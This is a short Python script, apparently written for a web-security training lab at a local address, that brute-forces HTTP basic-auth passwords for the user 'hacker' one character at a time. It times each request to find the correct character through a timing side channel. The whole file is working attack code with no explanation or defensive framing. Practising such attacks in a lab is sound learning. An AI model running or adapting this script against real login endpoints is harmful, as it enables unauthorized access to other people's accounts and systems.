import requests
from datetime import datetime

char_array = "abcdefghijklmnopqrstuvwxyz1234567890"

url = "http://192.168.0.72/authentication/example2/"
session = requests.Session()
for letter in char_array:
    id = "hacker"
    password = ""+letter
    session.auth = (id, password)
    start_time = datetime.now()
    r = session.get(url)
    end_time = datetime.now()
    print(f"{id}/{password} [diff: {end_time - start_time}, status: {r.status_code}, result: {r.content}]")
    
